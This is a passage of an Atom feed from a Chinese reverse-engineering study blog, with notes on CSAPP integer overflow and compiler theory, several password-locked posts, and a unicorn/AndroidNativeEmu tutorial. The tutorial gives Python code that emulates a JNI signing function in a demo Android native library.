    <content type="html"><![CDATA[<p>学习一下csapp,第一篇</p><span id="more"></span><p>在32位系统：-2147483648&lt;2147483647结果为false</p><p>​int i &#x3D; -2147483648;i&lt;2147483647结果为true</p><p>​-2147483648-1&lt;2147483647结果为true</p><p>在计算机中运算是会发生溢出，假如运算后的数超过了32位，那最终结果可能是一个负数，或者是其他正整数</p><p>我们用linux中的gdb软件来证明其中的结论</p><p><img src="/./../images/image-20230109200402530.png" alt="image-20230109200402530"></p><p>很显然，上述超乎我们的预想</p><p>然而在整数运算时是符合交换律的，但是在计算机中浮点数却不符合交换律</p><p>这里做一个实验：用(1e20 + -1e20) + 3.14</p><p>结果为：3.1400000000000001</p><p>再用1e20 + (-1e20 + 3.14)，这里3.14对于-1e20微不足道</p><p>结果为：0</p><p>他们用有限的位组合形式表示在数域中无线扩张的数</p><p><img src="/./../images/image-20230109202910325.png" alt="image-20230109202910325"></p><h1 id="位、字节、整型"><a href="#位、字节、整型" class="headerlink" title="位、字节、整型"></a>位、字节、整型</h1>]]></content>
    
    
    <summary type="html">&lt;p&gt;学习一下csapp,第一篇&lt;/p&gt;</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>编译篇1</title>
    <link href="https://pa1r0t.github.io/2023/01/09/%E7%BC%96%E8%AF%91%E7%AF%871/"/>
    <id>https://pa1r0t.github.io/2023/01/09/%E7%BC%96%E8%AF%91%E7%AF%871/</id>
    <published>2023-01-09T02:16:11.000Z</published>
    <updated>2023-01-12T14:16:44.022Z</updated>
    
    <content type="html"><![CDATA[<p>引论学习</p><h3 id="程序设计语言的转换"><a href="#程序设计语言的转换" class="headerlink" title="程序设计语言的转换"></a>程序设计语言的转换</h3><ul><li>编译：从高级语言到低级语言的过程</li><li>解释：接受高级语言的一条语句输入，进行解释并控制计算机执行，马上获得该语句的执行结果，然后接受下一条语句<ul><li>优点：实现人机交互</li><li>缺点：效率差，每次都要解释，而不像编译一样，只需编译一次，以后只需执行即可</li></ul></li><li>编译的转换过程：<ul><li>两阶段转换：编译一一执行<img src="/./../images/image-20230109130459860.png" alt="image-20230109130459860"></li><li>三个阶段的转换：编译一一汇编一一运行<img src="/./../images/image-20230109131018804.png" alt="image-20230109131018804"></li></ul></li></ul><h3 id="编译程序概述"><a href="#编译程序概述" class="headerlink" title="编译程序概述"></a>编译程序概述</h3><p>自然语言的翻译：</p><ol><li>识别句子中一个个单词</li><li>分析句子的语法结构</li><li>根据句子的含义进行初步翻译</li><li>对译文进行修饰</li><li>写出最后译文</li></ol><p>编译程序的工作：</p><ul><li>词法分析</li><li>语法分析</li><li>语义分析和中间代码的生成</li><li>优化</li><li>目标代码的生成</li></ul><p><img src="/./../images/image-20230109173201830.png" alt="image-20230109173201830"></p><p>词法分析：</p><ul><li>任务：对源程序的字符串进行扫描和分解，识别出一个个单词</li><li>基本字：void,int,float</li><li>标识符：a,b,c,d</li><li>长整数：50</li><li>运算符：+，-，*，&#x3D;</li><li>界限符：{}，；（）</li><li>词法分析依照词法规则，识别出正确的单词，转换成统一规格，备用</li><li>转换：<ul><li>对基本字、运算符、界限符的转换</li><li>标识符的转换</li><li>常数的转换</li><li>转换完成的格式（类号、内码）</li></ul></li><li>描述词法规则的有效工具是正规式和有限自动机</li></ul><p>语法分析：</p><ul><li>任务：词法分析后的单词，根据语言的语法规则，把单词符号组成各类语法单位：子句、语句</li><li>语法规则：规定单词如何组成句，称为文法</li><li>语法规则的表示：<ul><li>BNF:A::&#x3D;B|C表示A定义为B或C</li></ul></li><li>语法分析的方法：<strong>推导</strong>和<strong>规约</strong></li><li>推导：最左推导和最右推导</li><li>规约：最右规约和最左规约</li></ul><p>赋值语句的语法规则：</p><ul><li>A::&#x3D;V&#x3D;E</li><li>E::&#x3D;T|E+T</li><li>T::&#x3D;F|T*F</li><li>F::&#x3D;V|(E)|C</li><li>V::&#x3D;标识符</li><li>C::&#x3D;常数</li></ul><h4 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h4><p>​x &#x3D; a + b*50根据上面的文法规则运用最右推导：最右推导就是每次只变换最右的字母</p><p>A&#x3D;&gt;V&#x3D;E&#x3D;&gt;V&#x3D;E+T&#x3D;&gt;V&#x3D;E+T*F&#x3D;&gt;</p><p>T&#x3D;E+T*C&#x3D;&gt;</p><p>T&#x3D;E+T*50&#x3D;&gt;</p><p>T&#x3D;E+F*50&#x3D;&gt;</p><p>T&#x3D;E+V*50&#x3D;&gt;</p><p>T&#x3D;E+b*50&#x3D;&gt;</p><p>T&#x3D;T+b*50&#x3D;&gt;</p><p>T&#x3D;V+b*50&#x3D;&gt;</p><p>T&#x3D;a+b*50</p><p>如何最左规约，就是从T&#x3D;a+b*50变换到A,也就是赋值运算成立，每次只变换最左边的字母，是最右推导的逆运算</p><p>计算机是用语法树来检验语法：</p><p><img src="/./../images/image-20230109181128958.png" alt="image-20230109181128958"></p><h3 id="中间代码生成"><a href="#中间代码生成" class="headerlink" title="中间代码生成"></a>中间代码生成</h3><ul><li>任务：根据语法分析其中的含义，进行初步翻译，产生介于源代码和目标代码之间的一种代码</li><li>分为两阶段的工作：<ul><li>对每种语法范畴进行静态语义检查</li><li>如果语义正确，就进行中间代码的翻译</li></ul></li><li>中间代码形式：四元式、三元式、逆波兰式</li></ul><p>将x&#x3D;a+b*50变成中间代码：</p><table><thead><tr><th align="center">序号</th><th align="center">算符</th><th align="center">左操作数</th><th align="center">右操作数</th><th align="center">结果</th></tr></thead><tbody><tr><td align="center">（1）</td><td align="center">将整常数50转换为实常数</td><td align="center"></td><td align="center"></td><td align="center">T<del>1</del></td></tr><tr><td align="center">（2）</td><td align="center">*</td><td align="center">b</td><td align="center">T<del>1</del></td><td align="center">T<del>2</del></td></tr><tr><td align="center">（3）</td><td align="center">+</td><td align="center">a</td><td align="center">T<del>2</del></td><td align="center">T<del>3</del></td></tr><tr><td align="center">（4）</td><td align="center">&#x3D;</td><td align="center">T<del>3</del></td><td align="center"></td><td align="center">x</td></tr></tbody></table><p>以上就是四元式</p><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><ul><li>对中间代码进行加工变换，变换出效率更高的代码</li><li>原则：等价变换，在不改变原意的情况下</li><li>主要方面：<ul><li>公共子表达式的提取：x&#x3D;<strong>(a+b)</strong>*c+<strong>(a+b)</strong>*d</li><li>合并已知量：c&#x3D;a+b   d &#x3D; a+b   未改变a，b的值</li><li>删除无用语句：一些注释或者一些与程序本身无关的表达式</li><li>循环优化</li></ul></li></ul><p>例如将以下语句转成中间代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>( k = <span class="number">1</span>; k &lt;= <span class="number">100</span>; k++)&#123;</span><br><span class="line">m = i + <span class="number">10</span>*k;</span><br><span class="line">n = j + <span class="number">10</span>*k;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/./../images/image-20230110193728210.png" alt="image-20230110193728210"></p><p>优化：每次乘实际上都是在上一次的基础是+10,所以能将乘操作优化成加法操作，来达到提升效率的目的</p><p><img src="/./../images/image-20230110193939323.png" alt="image-20230110193939323"></p><h3 id="目标代码生成"><a href="#目标代码生成" class="headerlink" title="目标代码生成"></a>目标代码生成</h3><ul><li>任务：把优化的中间代码转化成特定机器上的低级语言</li><li>目标指令的形式：<ul><li>绝对指令代码：就是01010的机器代码如exe文件，可立即执行</li><li>汇编指令代码：汇编语言程序，需要通过汇编程序汇编后才能运行</li><li>可重定位指令代码：先将各目标模块连接起来，确定变量、常数在主存中的位置，装入主存后才能成为可以运行的绝对指令代码</li></ul></li></ul><h3 id="表格与表格管理"><a href="#表格与表格管理" class="headerlink" title="表格与表格管理"></a>表格与表格管理</h3><ul><li>表格作用：用来记录源程序的各种信息以及编译过程中的各种状况</li><li>与编译前三阶段有关的表格：<ul><li>符号表：用来登记 源程序中的常量名、 变量名、数组名、 过程名等，记录它 们的性质、定义和引用情况<img src="/./../images/image-20230110195304443.png" alt="image-20230110195304443"></li><li>常数表与标号表：登记各类常数值，登记标号的定义与作用<img src="/./../images/image-20230110195424180.png" alt="image-20230110195424180"></li><li>入口名表：登记过程的层号，分程序符号表入口<img src="/./../images/image-20230110195523654.png" alt="image-20230110195523654"></li><li>中间代码表</li></ul></li></ul><h3 id="出错与处理"><a href="#出错与处理" class="headerlink" title="出错与处理"></a>出错与处理</h3><p>错误类型:</p><ul><li>语法错误:在词法分析和语法分析阶段检测出来</li><li>语义错误：一般在语义分析阶段检测</li></ul><p>遍：指对源程序或源程序的中间结果从头到尾扫 描一次，并做有关的加工处理，生成新的中间结 果或目标代码的过程。</p><p>（遍与阶段的含义毫无关系。）</p><p>一遍扫描</p><p><img src="/./../images/image-20230110195852519.png" alt="image-20230110195852519"></p><p>&#x3D;&#x3D;一遍扫描不是一次性扫描和分析，而是通过一句一句的表格是进行反复扫描和分析&#x3D;&#x3D;</p><h3 id="编译程序生成"><a href="#编译程序生成" class="headerlink" title="编译程序生成"></a>编译程序生成</h3><p>生成方式：</p><ol><li>直接用机器语言编写编译程序</li><li>用汇编语言编写编译程序<ul><li>注：编译程序核心部分常用汇编语言编写</li></ul></li><li>用高级语言编写编译程序：这是普遍采用的方法</li><li>.自编译：内置核心编译程序，如何用自身的核心程序去编译其他程序</li><li>编译工具：LEX(词法分析)与YACC(用于自动产生LALR分析 表)</li><li>移植（同种语言的编译程序在不同类型的机器之 间移植）</li></ol><p>写编译程序的基本条件：</p><ul><li>源程序语言</li><li>目标程序语言</li><li>编译方法</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;引论学习&lt;/p&gt;
&lt;h3 id=&quot;程序设计语言的转换&quot;&gt;&lt;a href=&quot;#程序设计语言的转换&quot; class=&quot;headerlink&quot; title=&quot;程序设计语言的转换&quot;&gt;&lt;/a&gt;程序设计语言的转换&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;编译：从高级语言到低级语言的过程&lt;/li&gt;
&lt;l</summary>
      
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>AST混淆2</title>
    <link href="https://pa1r0t.github.io/2023/01/05/AST%E6%B7%B7%E6%B7%862/"/>
    <id>https://pa1r0t.github.io/2023/01/05/AST%E6%B7%B7%E6%B7%862/</id>
    <published>2023-01-05T09:57:25.000Z</published>
    <updated>2023-01-08T14:31:35.707Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="仅限作者学习使用" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="2547279a647a15ac5826b09e2e244a5836d1a7222d47a99a138c2add758e5f34"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">AST的API详解</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>AST混淆1</title>
    <link href="https://pa1r0t.github.io/2023/01/03/AST%E6%B7%B7%E6%B7%861/"/>
    <id>https://pa1r0t.github.io/2023/01/03/AST%E6%B7%B7%E6%B7%861/</id>
    <published>2023-01-03T11:32:24.000Z</published>
    <updated>2023-01-05T06:47:15.734Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="仅限作者学习使用" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="feabf31d2c4fafb8bdfb373a4cbf3b6320e6a54ec69cd00f444279d006de9e72"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">JavaScript代码安全防护原理</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>ollvm做法</title>
    <link href="https://pa1r0t.github.io/2023/01/02/ollvm%E5%81%9A%E6%B3%95/"/>
    <id>https://pa1r0t.github.io/2023/01/02/ollvm%E5%81%9A%E6%B3%95/</id>
    <published>2023-01-02T14:06:24.000Z</published>
    <updated>2023-01-12T14:08:24.883Z</updated>
    
    <content type="html"><![CDATA[<p>unicorn start</p><span id="more"></span><h3 id="目标-处理ollvm混淆"><a href="#目标-处理ollvm混淆" class="headerlink" title="目标:处理ollvm混淆"></a>目标:处理ollvm混淆</h3><p><img src="/./../images/image-20230102221120506.png" alt="image-20230102221120506"></p><p><img src="/./../images/image-20230102221205367.png" alt="image-20230102221205367"></p><h3 id="用脚本处理该函数"><a href="#用脚本处理该函数" class="headerlink" title="用脚本处理该函数"></a>用脚本处理该函数</h3><p>在脚本中设置起始地址和文件名</p><p><img src="/./../images/image-20230102221258379.png" alt="image-20230102221258379"></p><p>然后执行该python文件</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;unicorn start&lt;/p&gt;</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>x86暴力调用so</title>
    <link href="https://pa1r0t.github.io/2023/01/02/unicorn-x86%E6%9A%B4%E5%8A%9B%E8%B0%83%E7%94%A8/"/>
    <id>https://pa1r0t.github.io/2023/01/02/unicorn-x86%E6%9A%B4%E5%8A%9B%E8%B0%83%E7%94%A8/</id>
    <published>2023-01-02T01:03:22.000Z</published>
    <updated>2023-01-02T08:15:42.212Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="仅限作者学习使用" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="386a0717fc183f56c1a5e8c16379bd56eabddd84599bc94e3f5df493b6c7eccb"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">c++暴力调用so</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>unicorn_learning5</title>
    <link href="https://pa1r0t.github.io/2023/01/01/unicorn-learning5/"/>
    <id>https://pa1r0t.github.io/2023/01/01/unicorn-learning5/</id>
    <published>2023-01-01T01:58:42.000Z</published>
    <updated>2023-01-01T14:00:18.045Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="仅限作者学习使用" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="8b46c0a4067b2619659e160c5c11ca182d0fd259a4ce5827b74834d766d3566f"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">unicorn调用动态注册的函数</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>unicorn_learning4</title>
    <link href="https://pa1r0t.github.io/2022/12/31/unicorn-learning4/"/>
    <id>https://pa1r0t.github.io/2022/12/31/unicorn-learning4/</id>
    <published>2022-12-31T06:12:48.000Z</published>
    <updated>2022-12-31T08:10:21.907Z</updated>
    
    <content type="html"><![CDATA[<p>unicorn_starting</p><p>模拟Jni与Java交互</p><span id="more"></span><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p>hook这个函数，其中存在调用java类和java函数</p><p><img src="/./../images/image-20221231150501748.png" alt="image-20221231150501748"></p><p>尝试将上一次的代码进行修改后直接执行，观察结果</p><p><img src="/./../images/image-20221231153507375.png" alt="image-20221231153507375"></p><h3 id="注册java类和方法"><a href="#注册java类和方法" class="headerlink" title="注册java类和方法"></a>注册java类和方法</h3><p>结果发现不能找到java这个类，下面已经给出申明，直接复制即可</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">com_sec_udemo_MainActivity</span>(metaclass=JavaClassDef, jvm_name=<span class="string">&quot;com/sec/udemo/MainActivity&quot;</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># 添加自定义java类</span></span><br><span class="line">emulator.java_classloader.add_class(com_sec_udemo_MainActivity)</span><br></pre></td></tr></table></figure><p>执行后发现又要声明相关方法:</p><p><img src="/./../images/image-20221231154406776.png" alt="image-20221231154406776"></p><p>声明方法：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@java_method_def(<span class="params">name=<span class="string">&#x27;getSaltFromJava&#x27;</span>,signature=<span class="string">&#x27;(Ljava/lang/String;)Ljava/lang/String;&#x27;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">                     args_list=[<span class="string">&#x27;jstring&#x27;</span>],native=<span class="literal">False</span></span>) </span><span class="comment"># 这里native=False申明此方法非native方法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSaltFromJava</span>(<span class="params">self,mu,data</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>这个函数在java中的功能如下：</p><p><img src="/./../images/image-20221231142325743.png" alt="image-20221231142325743"></p><p>这里我们作出拼接返回即可</p><p>执行后再次报错</p><p><img src="/./../images/image-20221231155418523.png" alt="image-20221231155418523"></p><p>这里我们缺少jobject对象，这里我们手动创建一下，然后传入进去</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">obj = com_sec_udemo_MainActivity()</span><br><span class="line">sign = emulator.call_symbol(libnat_mod,<span class="string">&#x27;Java_com_sec_udemo_MainActivity_sign_1lv3&#x27;</span>,</span><br><span class="line">emulator.java_vm.jni_env.address_ptr,obj,<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(sign)</span><br></pre></td></tr></table></figure><p>然后这里又有相加时出现错误</p><p><img src="/./../images/image-20221231160243373.png" alt="image-20221231160243373"></p><p>这里我们调试一下，data的内容：</p><p><img src="/./../images/image-20221231160423365.png" alt="image-20221231160423365"></p><p>一看是java string类型，类型展开发现value中value就是python的str类型</p><p><img src="/./../images/image-20221231160549317.png" alt="image-20221231160549317"></p><p>修改后成功出结果：</p><p><img src="/./../images/image-20221231160712892.png" alt="image-20221231160712892"></p><p>完整代码：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> androidemu.java.helpers.native_method <span class="keyword">import</span> native_method</span><br><span class="line"><span class="keyword">from</span> UnicornTraceDebugger <span class="keyword">import</span> udbg</span><br><span class="line"><span class="keyword">from</span> androidemu.emulator <span class="keyword">import</span> Emulator</span><br><span class="line"><span class="keyword">from</span> androidemu.utils <span class="keyword">import</span> memory_helpers</span><br><span class="line"><span class="keyword">from</span> androidemu.java.java_classloader <span class="keyword">import</span> JavaClassDef</span><br><span class="line"><span class="keyword">from</span> androidemu.java.java_method_def <span class="keyword">import</span> java_method_def</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置logging</span></span><br><span class="line">logging.basicConfig(</span><br><span class="line">    stream=sys.stdout,</span><br><span class="line">    level=logging.DEBUG,</span><br><span class="line">    <span class="built_in">format</span>=<span class="string">&quot;%(asctime)s %(levelname)7s %(name)34s | %(message)s&quot;</span></span><br><span class="line">                    )</span><br><span class="line"><span class="comment"># 用于打印调试信息</span></span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">com_sec_udemo_MainActivity</span>(metaclass=JavaClassDef, jvm_name=<span class="string">&quot;com/sec/udemo/MainActivity&quot;</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="meta">    @java_method_def(<span class="params">name=<span class="string">&#x27;getSaltFromJava&#x27;</span>,signature=<span class="string">&#x27;(Ljava/lang/String;)Ljava/lang/String;&#x27;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">                     args_list=[<span class="string">&#x27;jstring&#x27;</span>],native=<span class="literal">False</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getSaltFromJava</span>(<span class="params">self,mu,data</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> data.value.value + <span class="string">&#x27;salt..&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据执行失败的库函数，进行hook，直接本地写函数实现相关库函数功能,首先导入修饰器</span></span><br><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__aeabi_memclr</span>(<span class="params">mu,addr,size</span>):</span><br><span class="line">    mu.mem_write(addr,<span class="built_in">bytes</span>(size))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;__aeabi_memclr_ptr (addr:%x,size:%d)&#x27;</span> % (addr,size))</span><br><span class="line"></span><br><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__aeabi_memcpy</span>(<span class="params">mu,dist,source,size</span>):</span><br><span class="line">    data = mu.mem_read(source,size)</span><br><span class="line">    mu.mem_write(dist,<span class="built_in">bytes</span>(data))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;__aeabi_memcpy (dist:%x,source:%x)&#x27;</span> % (dist,source))</span><br><span class="line"></span><br><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sprintf</span>(<span class="params">mu,buffer,<span class="built_in">format</span>,arg1,arg2</span>):</span><br><span class="line">    format1 = memory_helpers.read_utf8(mu,<span class="built_in">format</span>)</span><br><span class="line">    data1 = memory_helpers.read_utf8(mu,arg1)</span><br><span class="line">    res = format1 % (data1,arg2)</span><br><span class="line">    mu.mem_write(buffer,<span class="built_in">bytes</span>((res+<span class="string">&#x27;\x00&#x27;</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;sprintf (%s)&#x27;</span> % (<span class="built_in">format</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建模拟器</span></span><br><span class="line">emulator = Emulator()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加hook 此处必须在导入so文件之前就hook，因为此hook的本质就是hook got表的内容</span></span><br><span class="line"><span class="comment"># 在导入so文件之前hook才生效，导入之后没法hook</span></span><br><span class="line">emulator.modules.add_symbol_hook(<span class="string">&#x27;__aeabi_memclr&#x27;</span>, emulator.hooker.write_function(__aeabi_memclr) + <span class="number">1</span>)</span><br><span class="line">emulator.modules.add_symbol_hook(<span class="string">&#x27;__aeabi_memcpy&#x27;</span>, emulator.hooker.write_function(__aeabi_memcpy) + <span class="number">1</span>)</span><br><span class="line">emulator.modules.add_symbol_hook(<span class="string">&#x27;sprintf&#x27;</span>, emulator.hooker.write_function(sprintf) + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加自定义java类</span></span><br><span class="line">emulator.java_classloader.add_class(com_sec_udemo_MainActivity)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载相关so文件</span></span><br><span class="line"><span class="comment"># do_init 参数为false，即不执行初始化函数，因为unicorn不能实现相关初始化操作，</span></span><br><span class="line"><span class="comment"># 这可能会涉及更多库的调用</span></span><br><span class="line">emulator.load_library(<span class="string">&#x27;./lib/libc.so&#x27;</span>,do_init=<span class="literal">False</span>)</span><br><span class="line">libnat_mod = emulator.load_library(<span class="string">&#x27;./lib/libnative-lib.so&#x27;</span>,do_init=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行报错时打印调试信息，跟踪报错与定位发生报错的相关地址</span></span><br><span class="line">dbg = udbg.UnicornDebugger(emulator.mu,udbg.UDBG_MODE_ALL)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开始执行想要执行的jni函数</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 根据so模块调用指定的函数，后面都是函数的参数</span></span><br><span class="line">    <span class="comment"># 参数1: JNIEnv</span></span><br><span class="line">    <span class="comment"># 参数2: 是java类的对象，这里填0即可</span></span><br><span class="line">    <span class="comment"># 参数3: 是函数输入字符串</span></span><br><span class="line">    obj = com_sec_udemo_MainActivity()</span><br><span class="line">    sign = emulator.call_symbol(libnat_mod,<span class="string">&#x27;Java_com_sec_udemo_MainActivity_sign_1lv3&#x27;</span>,</span><br><span class="line">                         emulator.java_vm.jni_env.address_ptr,obj,<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(sign)</span><br><span class="line"><span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="comment"># 打印调用栈</span></span><br><span class="line">    tracks = dbg.get_tracks()</span><br><span class="line">    <span class="comment"># 这里打印调用地址即可，打印后100条</span></span><br><span class="line">    <span class="keyword">for</span> addr <span class="keyword">in</span> tracks[-<span class="number">100</span>:-<span class="number">1</span>]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(addr - <span class="number">0xcbc66000</span>))</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;unicorn_starting&lt;/p&gt;
&lt;p&gt;模拟Jni与Java交互&lt;/p&gt;</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>unicorn_learning3</title>
